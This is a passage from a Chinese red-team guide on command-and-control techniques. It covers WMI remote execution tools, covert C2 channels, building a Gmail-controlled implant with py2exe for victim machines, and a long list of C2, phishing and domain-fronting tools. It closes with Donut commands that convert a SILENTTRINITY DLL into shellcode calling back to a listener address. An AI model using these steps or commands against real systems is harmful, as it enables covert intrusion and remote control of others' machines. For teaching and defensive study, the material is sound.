### 读取文件和注册表项
- 文件系统审查
- Windows 事件审查

红队可以利用 WMI 的功能以及其在各种 Windows 系统中的广泛适用性，来执行主机侦察、命令执行、横向移动和维持会话持久性。WMI 服务通过 DCOM（TCP 端口 135）或 WinRM 协议（SOAP - 端口 5985）运行，并以 SYSTEM 权限运行，需要管理员凭据。自 2014 年以来，已存在多种公开工具，可利用 WMI 进行命令和控制。

**WmiShell 和 WmiSploit**
- **WmiShell** 是一个 PowerShell 脚本，属于 [WmiSploit](https://github.com/secabstraction/WmiSploit) 项目的一部分。
  ```powershell
  Enter-WmiShell -ComputerName desktop-1st179m -UserName netbiosX
  ```
  ![](media/image376.jpeg){width="5.8633781714785655in" height="2.1141666666666667in"}

- **Invoke-WmiCommand** 可以使用 WMI 作为通信通道，在远程目标上执行 PowerShell 命令和脚本。
  ```powershell
  Invoke-WmiCommand -ComputerName desktop-1st179m -ScriptBlock {tasklist}
  ```

**WMImplant**
- **WMImplant** 由 Chris Truncer 开发，是一个利用 WMI 进行攻击性操作的 PowerShell 工具。它可用作 C2 工具，优点是不需要将客户端程序放在目标上，但需要管理员凭据。
  ```powershell
  Import-Module .\WMImplant.ps1
  Invoke-WMImplant
  ```
  执行 `change_user` 命令为远程连接提供正确的凭据后，可以在主菜单中找到 WMImplant 的功能，包括文件传输、横向移动和主机侦察。
  ![](media/image377.jpeg){width="5.787023184601924in" height="2.863748906386702in"}
  在目标机器上执行系统命令：
  ![](media/image378.jpeg){width="5.788461286089239in" height="3.1175in"}

### 标准加密协议
攻击者可以直接使用已知的加密算法来隐藏命令和控制流量，而不是依赖于通信协议提供的任何内在保护。尽管使用了安全算法，但如果一些必要的密钥被编码或保存在恶意病毒样本、配置文件中，则安全性可能易受逆向工程的影响。

### 标准非应用层加密
- 使用标准的非应用层协议进行主机与 C2 服务器之间或网络中受感染主机之间的通信。可能的协议列表很广泛，例如：
  - 网际控制报文协议（ICMP）
  - 用户数据报协议（UDP）
  - Socket Secure（SOCKS）
  - Serial over LAN (SOL)

ICMP 通信是一个例子。由于 ICMP 是 Internet 协议套件的一部分，因此所有与 IP 兼容的主机都必须实现；然而，它不像其他互联网协议（如 TCP 或 UDP）那样受到监视，可能会被攻击者用来隐藏通信。

### 非常用端口
- 攻击者可以通过非标准端口与 C2 服务器进行通信，从而绕过未正确配置的代理和防火墙。

### 网络服务
- 攻击者可以使用现有的合法外部 Web 服务作为将命令中继到目标系统的一种方法。这些命令还包括指向 C2 基础结构的指针。流行网站和社交媒体可能会作为 C2 提供一定的保障，因为网络中的主机可能已经在感染之前与它们通信。Web 服务提供商通常使用 SSL/TLS 加密，为攻击者提供更高级别的保护。使用 Web 服务还可以保护后端 C2 基础架构免受恶意软件二进制分析的发现，同时还可以实现操作弹性（因为此基础架构可能会动态更改）。

### 实践
#### C2 with Gmail
- **Gcat** 是一个基于 Python 的框架，它使用 Gmail 作为 C2 服务器。Gcat 将定期检查 Gmail 收件箱，查看是否有任何带有活动 ID 的新消息。如果有，这些电子邮件中包含的命令将在受感染的主机上执行，当收到新的响应消息时，该信息将传递给 Gcat 的控制台。
  - 启用以下设置：
    - 允许安全性较低的应用：![](media/image379.jpeg){width="5.801067366579177in" height="1.8004166666666668in"}
    - 启用 IMAP 设置：[https://mail.google.com/mail/u/0/#settings/fwdandpop](https://mail.google.com/mail/u/0/%23settings/fwdandpop)
      ![](media/image380.jpeg){width="5.824683945756781in" height="5.044791119860018in"}

  - 创建 setup.py 文件并使用 py2exe 将 implant.py 文件转换为可执行文件。
    ```python
    from distutils.core import setup
    import py2exe

    setup(console=['implant.py'])
    ```
    运行上述代码：
    ```bash
    python2 setup.py py2exe
    ```
    修改 gcat.py 中对应的 Gmail 用户名和密码。
    ![](media/image381.jpeg){width="5.835406824146982in" height="1.172082239720035in"}

  - 当生成的 exe 成功在受害者机器上运行时，攻击者就可以通过 Gmail 发送命令。
    ![](media/image382.jpeg){width="5.850346675415573in" height="1.0029155730533683in"}

- **Gdog** 与 Gcat 原理相同，但功能更强大。它需要配置允许安全性较低的应用和启用 IMAP。
  - 特点：
    - 通信数据加密（AES）+ SHA256 哈希
    - 使用系统信息生成唯一的 ID（SHA256 哈希）
    - 获取系统信息、地理信息、进程、服务、用户、设备等
    - 执行系统命令
    - 从客户端下载文件、上传文件至客户端、执行 shellcode
    - 截屏
    - 锁定客户端屏幕、键盘记录
    - 关闭或重启远程计算机、注销当前用户
    - 从 Web 下载文件、访问网站
    - 弹出消息框

### 常用工具
#### 远程访问工具
- **Cobalt Strike**: 一款非常优秀的后渗透平台。[https://cobaltstrike.com/](https://cobaltstrike.com/)
- **Empire**: 一个纯粹的 PowerShell 后期漏洞利用代理工具。[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
- **Metasploit Framework**: 一个软件漏洞利用框架。[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
- **Pupy**: 一个基于 Python 的开源跨平台远程管理和后期利用工具。[https://github.com/n1nj4sec/pupy](https://github.com/n1nj4sec/pupy)
- **Koadic**: 一个 js/vbs 远控工具，模块丰富。[https://github.com/zerosum0x0/koadic](https://github.com/zerosum0x0/koadic)
- **PoshC2**: 一款基于 PowerShell 和 C# 的命令控制工具。[https://github.com/nettitude/PoshC2](https://github.com/nettitude/PoshC2)
- **Gcat**: 一个使用 Gmail 控制管理的 Python 隐形后门。[https://github.com/byt3bl33d3r/gcat](https://github.com/byt3bl33d3r/gcat)
- **TrevorC2**: 一个合法的网站，用于隐藏命令执行的客户端/服务器通信。[https://github.com/trustedsec/trevorc2](https://github.com/trustedsec/trevorc2)
- **Merlin**: 一个用 Go 语言编写的跨平台后期利用 HTTP/2 命令与控制服务器和代理。[https://github.com/Ne0nd0g/merlin](https://github.com/Ne0nd0g/merlin)
- **Quasar**: 一个用 C# 编码的快速轻量级远程管理工具。[https://github.com/quasar/QuasarRAT](https://github.com/quasar/QuasarRAT)

#### Staging
- **Red Baron**: 一组 Terraform 模块和定制/第三方提供商，用于自动创建弹性、一次性、安全和灵活的基础架构。[https://github.com/Coalfire-Research/Red-Baron](https://github.com/Coalfire-Research/Red-Baron)
- **EvilURL**: 为 IDN 同形异义字攻击生成 Unicode 域名并检测它们。[https://github.com/UndeadSec/EvilURL](https://github.com/UndeadSec/EvilURL)
- **Domain Hunter**: 检查过期域名、bluecoat 分类和 Archive.org 历史记录，以确定适合钓鱼和 C2 的域名。[https://github.com/threatexpress/domainhunter](https://github.com/threatexpress/domainhunter)
- **PowerDNS**: 一个简单的 PoC，演示如何使用 DNS 执行 PowerShell 脚本。[https://github.com/mdsecactivebreach/PowerDNS](https://github.com/mdsecactivebreach/PowerDNS)
- **Chameleon**: 帮助红队将其基础架构分类为任意类别的工具。[https://github.com/mdsecactivebreach/Chameleon](https://github.com/mdsecactivebreach/Chameleon)
- **CatMyFish**: 搜索分类域，为 Cobalt Strike beacon C&C 设置白名单域。[https://github.com/Mr-Un1k0d3r/CatMyFish](https://github.com/Mr-Un1k0d3r/CatMyFish)
- **Malleable C2**: 用于重新定义 Beacon 通信中的指标。[https://github.com/rsmudge/Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
- **Malleable-C2-Randomizer**: 通过随机化 Malleable C2 配置文件减少基于签名的检测机会。[https://github.com/bluscreenofjeff/Malleable-C2-Randomizer](https://github.com/bluscreenofjeff/Malleable-C2-Randomizer)
- **FindFrontableDomains**: 搜索潜在的 frontable 域。[https://github.com/rvrsh3ll/FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains)
- **Postfix-Server-Setup**: 自动化建立一个网络钓鱼服务器。[https://github.com/n0pe-sled/Postfix-Server-Setup](https://github.com/n0pe-sled/Postfix-Server-Setup)
- **DomainFronting**: 列出 CDN 的 Domain Frontable 域列表。[https://github.com/vysec/DomainFrontingLists](https://github.com/vysec/DomainFrontingLists)
- **Apache2-Modrewrite-Setup**: 快速在基础架构中实现 Modrewrite。[https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup](https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup)
- **mod_rewrite**: 沙箱逃逸。[https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10)
- **externalc2framework**: 允许使用 beacon 数据包并通过可选端口与 Team Server 交互。[https://github.com/Und3rf10w/externalc2_framework](https://github.com/Und3rf10w/externalc2_framework)
- **ExternalC2**: 一个用于将通信渠道与 Cobalt Strike External C2 服务器集成的库。[https://github.com/ryhanson/ExternalC2](https://github.com/ryhanson/ExternalC2)
- **cs2 modrewrite**: 将 CobaltStrike 配置文件转换为 modrewrite 脚本的工具。[https://github.com/threatexpress/cs2modrewrite](https://github.com/threatexpress/cs2modrewrite)
- **e2modrewrite**: 将 Empire 配置文件转换为 Apache modrewrite 脚本。[https://github.com/infosecn1nja/e2modrewrite](https://github.com/infosecn1nja/e2modrewrite)
- **Domain Fronting Google App Engine**: 一个云平台，允许用户构建和部署自制的 Web 和移动应用程序。[https://github.com/redteam-cyberark/Google-Domain-fronting](https://github.com/redteam-cyberark/Google-Domain-fronting)
- **NGINX 提供随机 Payload**: [https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9](https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9)
- **Empire 自动任务执行**: [https://github.com/bneg/RedTeam-Automation](https://github.com/bneg/RedTeam-Automation)
- **meek**: Tor 的一种传输插件，将数据流编码为一系列 HTTPS 请求和响应。[https://github.com/arlolra/meek](https://github.com/arlolra/meek)
- **CobaltStrike-ToolKit**: 一些实用的 CobaltStrike 脚本。[https://github.com/killswitch-GUI/CobaltStrike-ToolKit](https://github.com/killswitch-GUI/CobaltStrike-ToolKit)

### 案例
命令和控制策略表示攻击者如何与目标网络内的其控制下的系统进行通信。根据系统配置和网络拓扑，攻击者可以通过多种方式建立具有各种隐蔽级别的命令和控制。由于网络级别对手可以获得的广泛变化，只有最常见的因素被用来描述命令和控制的差异。在所记录的方法中仍然有许多特定的技术，主要是由于定义新协议和使用现有的合法协议和网络服务进行通信是多么容易。

由此产生的细分应该有助于传达这样一个概念，即在没有先验知识的情况下通过命令和控制协议检测入侵是长期的困难主张。攻击者在网络级防御避免方面的主要限制因素是测试和部署工具，以快速更改其协议，了解现有防御技术以及访问合法的 Web 服务，这些服务在适当使用时，难以将其工具与良性流量区分开来。

### SILENTTRINITY & DONUT
- **Donut**: [https://thewover.github.io/Introducing-Donut/](https://thewover.github.io/Introducing-Donut/)
- **Donut GitHub**: [https://github.com/TheWover/donut/](https://github.com/TheWover/donut/)
- **Donut Releases**: [https://github.com/TheWover/donut/releases/tag/v0.9](https://github.com/TheWover/donut/releases/tag/v0.9)
- **SILENTTRINITY GitHub**: [https://github.com/byt3bl33d3r/SILENTTRINITY](https://github.com/byt3bl33d3r/SILENTTRINITY)

示例命令：
```bash
.\donut.exe -a 1 -f .\SILENTTRINITY_DLL.dll -c ST -m Main -p http://192.168.10.1:80
.\donut.exe -a 2 -f .\SILENTTRINITY_DLL.dll -c ST -m Main -p http://192.168.10.1:80
$filename="C:\Users\demon\Desktop\payload.bin"
[convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
```
![](media/image383.png)[e Ser ver](https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg) --- [Pytlion • sudo](https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg) --- [105, 30](https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg)
![](media/image384.png){width="5.865637576552931in" height="6.355in"}

*内含视频内容*: [https://www.ggsec.cn/donut.html](http://www.ggsec.cn/donut.html)

### Wikipedia C2
更多关于 C2 的信息，请参阅维基百科。